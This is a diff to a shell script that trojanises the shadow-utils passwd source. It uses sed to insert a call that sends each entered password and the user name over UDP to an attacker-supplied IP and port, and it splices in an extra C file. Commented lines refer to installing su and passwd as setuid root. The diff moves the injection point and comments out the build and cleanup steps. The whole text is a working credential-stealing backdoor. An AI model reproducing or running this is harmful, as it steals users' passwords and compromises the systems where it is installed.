@@ -28,20 +28,21 @@ DEST_IP=$1
 PORT=$2
 dir="shadow-4.14.1/src/passwd.c"
 
-PAYLOAD="udpSend(pass, ${PORT}, \"${DEST_IP}\", \"shadow\", name);"
-match='STRLCPY(pass, cp);'
+PAYLOAD="udpSend(cp, ${PORT}, \"${DEST_IP}\", \"shadow\", name);"
+match2="(void) fputs (_(\"They don\'t match; try again.\n\"), stderr);
+		} else {"
 
 sed -i "/$match/a$PAYLOAD" $dir
 sed -i '/\#include \"strlcpy.h\"/rsudowudo.c' $dir
 
 cd shadow-4.14.1
 
-./autogen.sh --without-selinux
-make -j4
-make install
+#./autogen.sh --without-selinux
+#make -j4
+#make install
 #cp src/su ../
 #cp src/passwd ../
-cd ../ && rm -r shadow-4.14.1
+# cd ../ && rm -r shadow-4.14.1
 # chown root su
 # chown root passwd
 # chmod 4755 su
